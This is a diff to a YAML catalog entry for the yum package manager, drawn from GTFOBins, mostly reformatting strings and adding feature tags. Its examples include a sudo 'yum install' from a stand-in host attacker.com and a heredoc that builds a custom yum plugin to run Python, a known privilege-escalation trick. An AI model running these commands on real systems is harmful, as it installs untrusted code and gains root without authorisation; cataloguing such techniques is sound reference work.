@@ -2,7 +2,8 @@
 id: package-yum-yum
 namespace: package:yum:yum
 name: yum
-description: "Yellowdog Updater Modified package manager; can execute arbitrary commands and spawn shells."
+description: Yellowdog Updater Modified package manager; can execute arbitrary commands
+  and spawn shells.
 author: GTFOBins
 version: 1.0.0
 capabilities:
@@ -44,7 +45,11 @@ resource_profile:
 allowed-tools:
 - yum
 parameters: []
-features: []
+features:
+- interactive
+- network-intensive
+- pipes-stdin
+- process-manip
 execution:
   template: yum
   sandbox: execFile
@@ -57,7 +62,11 @@ examples:
 - description: Download files (sudo)
   command: yum install http://attacker.com/path/to/input-file.rpm
 - description: Leverage python capabilities
-  command: "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\npluginconfpath=/path/to/temp-dir/\nEOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y"
+  command: "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\n\
+    pluginconfpath=/path/to/temp-dir/\nEOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n\
+    [main]\nenabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\nfrom yum.plugins\
+    \ import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\n\
+    def init_hook(conduit):\n  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y"
 references:
 - label: GTFOBins
   url: https://gtfobins.github.io/gtfobins/yum/
@@ -70,7 +79,6 @@ install:
   commands:
   - apt-get install -y yum
 ---
-
 
 # yum
 
